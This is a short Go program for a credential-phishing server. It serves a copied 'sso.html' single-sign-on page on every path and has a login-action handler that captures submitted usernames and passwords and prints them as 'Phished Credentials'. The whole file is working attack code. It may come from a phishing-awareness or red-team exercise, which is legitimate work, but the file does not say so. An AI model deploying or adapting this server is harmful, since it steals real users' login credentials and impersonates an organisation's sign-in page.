package main

import (
	"fmt"
	"github.com/gorilla/mux"
	"io"
	"io/ioutil"
	"log"
	"net/http"
)

func ServerStatus(w http.ResponseWriter, req *http.Request) {
	io.WriteString(w, "UPUPUP\n")
}

func Redirect(resp http.ResponseWriter, req *http.Request) {
	//io.WriteString(resp, "Redirecting to SSO ;) \n")
	body, _ := ioutil.ReadFile("sso.html")
	io.WriteString(resp, string(body))
}

func CredCollector(w http.ResponseWriter, req *http.Request) {
	req.ParseForm()
	username := req.FormValue("userid")
	password := req.FormValue("password")

	fmt.Printf("\nPhished Credentials:\n\n\tUser:\t\t%s\n\tPassword:\t%s\n\n", username, password)

}

func main() {
	rtr := mux.NewRouter()
	rtr.HandleFunc("/status", ServerStatus)
	rtr.HandleFunc("/autho/login/loginaction.html", CredCollector)

	rtr.HandleFunc("/{rest:.*}", Redirect)

	http.Handle("/", rtr)

	//err := http.ListenAndServeTLS(":4443", "cert.pem", "key.pem", nil)
	err := http.ListenAndServe(":3000", nil)
	if err != nil {
		log.Fatal("ListenAndServe: ", err)
	}
}
